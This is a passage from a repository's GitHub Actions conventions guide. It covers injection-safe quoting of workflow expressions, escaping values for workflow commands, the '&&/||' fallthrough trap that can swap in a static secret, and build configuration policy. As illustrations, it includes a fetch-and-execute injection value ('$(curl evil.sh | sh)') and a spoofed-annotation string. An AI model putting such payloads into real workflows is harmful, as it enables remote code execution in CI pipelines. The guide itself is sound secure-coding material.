  seems — it goes through `env:`. The list exists precisely so you never again have to ask "is this one safe";
  either it's on the list, or it isn't.
- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever.** Bash evaluates
  `$()`/backtick command substitution inside double quotes, so a value containing one (`$(curl evil.sh | sh)`)
  executes it outright — this is strictly worse than a single-quoted value from outside the pre-approved list,
  which at least requires a literal `'` to break out rather than a `$(`.
- **Exception: concatenation with a live shell variable or string** (e.g.
  `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where
  `DISPATCH_PREPROCESSOR_SYMBOLS` was itself captured via `env:` first). Capture the `${{ }}` value into its own
  `env:`-sourced variable, then concatenate that variable — never concatenate a raw `${{ }}` expression directly,
  even at the tail end of an otherwise-quoted string.
- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
  rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
  needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
  string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
  changing the inner quotes would break `jq`'s own parsing without improving security. Prefer routing the value
  through `env:` and a `--arg`/`--argjson` binding instead when the filter's structure allows it, since that also
  removes the value from the script text entirely.

### Escaping Free-Form Text in Workflow Commands

Routing a value through `env:` (previous section) makes it safe from **shell** injection. It does **not** make it
safe to print into a **workflow command** (`::notice::`, `::warning::`, `::error::`, `::group::`, etc.) — that is a
separate parsing layer the GitHub Actions runner applies to a step's stdout, independent of and after the shell.

- **A workflow command is recognized by the runner scanning stdout line by line for a line starting with `::`.** If
  a value is printed as part of a command's message and contains an embedded CR or LF, the value itself supplies a
  second "line" — and if that line happens to start with `::`, the runner treats it as a real command the workflow
  emitted, not as data. A reason like `"fine\n::error::fake failure"` turns one intended `::notice::` into a spoofed
  `::error::` annotation the workflow never wrote.
- **Always escape with `gh_escape` (`scripts/bash/lib/gh_core.sh`) before interpolating *any*
  value into a workflow command — the same "always, no judgment call" default as the quoting rule above, and the
  same pre-approved-list exception** (`github.actor`, `github.event_name`, a literal boolean/numeric constant — the
  identical list, for the identical reason: nothing else is guaranteed free of CR/LF/`%`). Never `printf %q`.
  GitHub's own documented workflow-command escaping is `%` -> `%25`,
  CR -> `%0D`, LF -> `%0A` (percent first, so the `%` introduced by the CR/LF substitutions is not itself
  re-escaped) — it neutralizes exactly the characters with parsing significance and leaves ordinary punctuation
  untouched. `printf %q` is a general bash shell-quoting escape: it happens to also remove raw newlines, but it
  additionally backslash-escapes every shell metacharacter (spaces, commas, parentheses, quotes), so a normal reason
  like `"fixed a bug, added tests (see #42)"` renders as `fixed\ a\ bug\,\ added\ tests\ \(see\ #42\)` in the Actions
  UI — correct, but needlessly unreadable.

  ```yaml
  # Preferred: gh_escape neutralizes only the characters that matter
  - name: Log manual trigger reason
    env:
      REASON: ${{ inputs.reason }}
    run: |
        source $DEVOPS_LIB_DIR/gh_core.sh
        escaped_reason=$(gh_escape "$REASON")
        printf '::notice::Manual release triggered by %s. Reason: %s\n' '${{ github.actor }}' "$escaped_reason"

  # Avoid: printf %q also escapes ordinary punctuation, and stacking it on an
  # already-escaped value double-escapes for no security benefit
  - name: Log manual trigger reason
    env:
      REASON: ${{ inputs.reason }}
    run: |
        printf '::notice::Reason: %q\n' "$REASON"
  ```

- **This is a distinct risk from the shell-injection rule above and does not substitute for it.** A value can be
  perfectly safe from shell injection (properly routed through `env:`) and still carry an unescaped CR/LF into a
  workflow command. Apply both rules together wherever a value reaches a `printf`/`echo` that emits a `::` command:
  `env:` for the shell, `gh_escape` for the runner's command parser.

### GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else

GitHub Actions expressions have no ternary operator; `cond && A || B` is the idiomatic stand-in, mirroring the same
`A && B || C` pattern bash writers reach for and ShellCheck's SC2015 warns about. Both are the identical trap in
different languages: the operators chain on **truthiness at each step**, not on `cond` in isolation. If `cond` is
true but `A` itself evaluates to something falsy (bash: non-zero exit; GitHub Actions: empty string, `false`, `0`,
`null`), the pair `cond && A` is itself falsy, so `|| B` fires anyway — silently substituting `B` for what should
have been "true, but empty."

- **This bit for real**, in this repo's own `NUGET_API_KEY: ${{ ... nuget-server == 'nuget' &&
  steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}`. If the `nuget` (trusted-publishing/OIDC)
  path's login step ever produced an empty output, `true && ''` collapsed to `''`, and the whole expression silently
  fell through to a long-lived static secret — defeating the point of trusted publishing by turning a failed OIDC
  login into a silent credential swap instead of a hard failure.
- **Fix: gate each branch by its own independent, negated condition — never by the truthiness of the other
  branch's payload.**

  ```yaml
  # Correct: the secret branch is gated by its own condition (!= 'nuget'), so an
  # empty OIDC output on the 'nuget' path is never masked by a fallback to the secret
  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server != 'nuget' && secrets.NUGET_API_KEY || steps.nuget-login.outputs.NUGET_API_KEY }}

  # Wrong: an empty steps.nuget-login output on the 'nuget' path falls through to
  # secrets.NUGET_API_KEY even though nuget-server == 'nuget' was true
  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server == 'nuget' && steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}
  ```

- **Any `cond && A || B` expression where `A` can legitimately be empty/false/zero MUST be checked for this before
  it ships**, not only in NuGet publishing — the same shape recurs anywhere a workflow picks between two outputs
  based on a condition. When in doubt, invert the condition so the branch that can be falsy is the one reached via
  `||`, not the one gated by `&&`.

## Build Configuration, TFMs, RIDs, and Preprocessor Symbols

- **`Directory.Build.props` is the single source of truth for `TargetFramework` and the artifacts layout**
  (`ArtifactsPath`, `UseArtifactsOutput`). Workflows and scripts MUST NOT duplicate or override these — they read
  build output locations, they do not decide them. This extends to every CLI flag and environment variable that
  threads one of these build-controlled values through a script (`--configuration`/`CONFIGURATION`,
  `--framework`/`FRAMEWORK`, `--runtime`/`RUNTIME`, `--artifacts-path`/`ARTIFACTS_PATH`, and any
  `dotnet-version`/`target-framework` workflow input): these exist as escape valves for a rare, deliberate exception,
  not as a general-purpose override mechanism. If a script or workflow ends up setting one of these to something
  other than its resolved default, that MUST be justified in writing — a comment at the override site, or the PR
  description — not merely "because the parameter is there." `Configuration`'s own narrow exception (below) is the
  model to follow: a named, human-triggered escape hatch with a stated reason, not a value CI computes or forwards by
  default. Conversely, an input or CLI flag that no caller ever sets to anything but the default is not a reserved
  knob — it is dead weight that has silently drifted from what the workflow actually does; remove it rather than
  leave it standing.
- **The Runtime Identifier (RID) is deliberately left unset (`""`) today.** Every package builds portable,
  framework-dependent, OS/architecture-agnostic output — no `RuntimeIdentifier` is set anywhere, and the
  `runtime-identifier` workflow input exists but defaults to unspecified. This is why `runner-os` (and the
  `runners-os` matrix in `_ci.yaml`) currently only selects which OS *runs* the build/test/benchmark step; it has no
  effect on the artifact itself, since the output is the same regardless of runner. The input exists precisely so
  this can change later: **when AOT publishing is introduced, RID becomes mandatory and MUST be derived from the
  runner**, not hardcoded once for all of them (e.g. `ubuntu-latest` → `linux-x64`, `windows-latest` → `win-x64`,
  `macos-latest` → `osx-arm64`). Treat `runner-os` as the future RID axis already in place, waiting for AOT to need
  it.
- **`Configuration` defaults to `Release`.** Workflow logic MUST NOT branch on or override `Configuration`; it is a
  manual/CLI override knob (`workflow_dispatch`, local `dotnet build -c ...`) for the rare case a human needs a
  Debug build, not something CI decides automatically. There is currently no scenario that justifies CI choosing
  anything else.
- **Keep the number of CI-driven preprocessor symbols to a minimum.** Today there is exactly one: `SHORT_RUN`,
  auto-defined by `Directory.Build.props` for local benchmark builds and added explicitly in CI only for a `push` to
  a non-main branch with no open PR yet (a faster, less comprehensive benchmark run; the PR-triggered run does the
  full one). Every other CI path (`pull_request`, `workflow_dispatch`, `push` to `main`) leaves
  `preprocessor-symbols` empty. Adding a new symbol is a deliberate ecosystem-wide decision, not a per-repo
  convenience — propose it here first.

---
*Canonical source: `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`*
*Copies maintained by `diff-shared.sh` — edit the canonical copy first.*
